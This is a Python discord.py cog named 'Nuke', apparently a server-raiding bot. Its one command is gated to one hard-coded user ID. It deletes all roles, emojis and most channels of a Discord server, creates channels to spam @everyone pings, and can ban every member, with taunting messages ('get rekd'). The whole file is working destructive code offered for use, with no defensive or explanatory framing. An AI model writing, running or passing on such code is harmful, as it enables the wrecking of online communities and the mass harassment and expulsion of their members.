import discord
from discord.ext import commands


class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    async def del_roles(self, ctx: commands.Context) -> None:
        roles = ctx.guild.roles
        for role in roles:
            try:
                await role.delete()
            except:
                pass

    async def del_emojis(self, ctx: commands.Context) -> None:
        emojis = ctx.guild.emojis
        for emoji in emojis:
            try:
                await emoji.delete()
            except:
                pass

    async def del_channels(self, ctx: commands.Context) -> None:
        channels = ctx.guild.channels
        curr_channel = ctx.message.channel
        for channel in channels:
            if channel != curr_channel:
                try:
                    await channel.delete()
                except:
                    pass

    async def ping_everyone(self, ctx: commands.Context, ping: int) -> None:
        temp_channels = []
        for i in range(10):
            temp_channels.append(await ctx.guild.create_text_channel("heh"))
        for i in range(ping):
            for channel in temp_channels:
                if isinstance(channel, discord.TextChannel):
                    await channel.send("@everyone")

    async def ban_everyone(self, ctx: commands.Context):
        members = ctx.guild.members
        for member in members:
            try:
                await member.ban()
            except:
                pass

    @commands.command()
    async def nuke(self, ctx: commands.Context, ping: int, ban: bool = None) -> None:
        if ctx.author.id == 808420517282578482:
            await ctx.send("hehe nuke go brrrr")
            await self.del_roles(ctx)
            await self.del_emojis(ctx)
            await self.del_channels(ctx)

            if ping:
                await self.ping_everyone(ctx, ping)
            if ban:
                await self.ban_everyone(ctx)
            await ctx.send("nuke done, get rekd")


def setup(bot: commands.Bot) -> None:
    bot.add_cog(Nuke(bot))